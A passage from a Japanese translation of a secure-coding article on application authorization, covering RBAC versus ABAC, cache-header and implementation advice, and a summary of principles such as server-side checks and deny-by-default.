これらのアプローチがいつ適用されるか、あるいは正確にどう定義されるかについて、普遍的な合意があるわけではありません。オペレータが定義できるポリシーの種類にはかなりの重なりがあります。より珍しいアプローチを選んだり自分で発明したりする前に、RBAC や ABAC がポリシーをモデル化する合理的な方法ではないのかを確認してください。

#### Implementation Considerations

最後に、アプリケーションへ認可を実装するときに考慮すべき助言をいくつか挙げます。

- ユーザーがブラウザを共有する場合、ブラウザキャッシュは認可モデルを大きく乱すことがあります。サーバー側の認可コードが毎回呼ばれるよう、リソースには `Cache-Control: private, no-cache, no-store` を設定してください。
- 検証ロジックに宣言的アプローチを使うか命令的アプローチを使うかは、必ず決めることになります。正解・不正解はありませんが、何が最も明快かを考える必要があります。Spring Security のアノテーションのような宣言的機構は簡潔で洗練されていますが、認可フローが複雑なら組み込みの式言語は入り組み、うまく分割されたコードを書くほうがよい場合もあります。
- カスタムであれフレームワークベースであれ、認可ロジックを集約し、重複を減らす解決策を探してください。認可コードがコードベース中に恣意的に散らばっているなら、保守は非常に難しくなり、それがセキュリティバグにつながります。

#### In Summary

- 認可は常にサーバー上で確認しなければならない。ユーザーインターフェイス部品を隠すことはユーザー体験としてはよいが、十分なセキュリティ対策ではない。
- 既定で拒否する。正の検証は負の検証より安全で間違いが少ない。
- コードはファイル、プロフィール、REST エンドポイントのような具体的リソースに対して認可すべきである。
- 認可はドメイン固有だが、権限モデル設計で検討すべき共通パターンがある。非常に強い理由がない限り、共通パターンとフレームワークに従う。
- 基本的なケースでは RBAC を使い、ポリシーを進化させられるよう権限とロールを分離しておく。
- より複雑なシナリオでは ABAC を検討し、XACML またはアプリケーション言語で書いたポリシーを使う。
